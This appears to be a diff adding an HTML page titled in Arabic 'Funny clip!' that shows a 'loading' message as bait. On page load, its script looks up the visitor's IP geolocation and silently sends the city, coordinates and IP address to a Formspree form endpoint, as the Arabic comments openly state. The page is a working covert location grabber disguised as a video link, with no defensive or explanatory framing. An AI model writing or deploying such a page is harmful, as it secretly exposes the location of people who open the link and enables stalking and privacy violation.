@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>مقطع مضحك!</title>
+</head>
+<body>
+    <h1>جاري تحميل المقطع...</h1>
+
+    <script>
+        // جمع بيانات الموقع وعنوان IP
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                const message = `
+                    المدينة: ${data.city}
+                    الإحداثيات: ${data.latitude}, ${data.longitude}
+                    الـIP: ${data.ip}
+                `;
+
+                // إرسال البيانات إلى Formspree
+                fetch('https://formspree.io/f/mgvaoqjg', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        message: message
+                    }),
+                });
+            })
+            .catch(error => console.error('Error:', error));
+    </script>
+</body>
+</html>
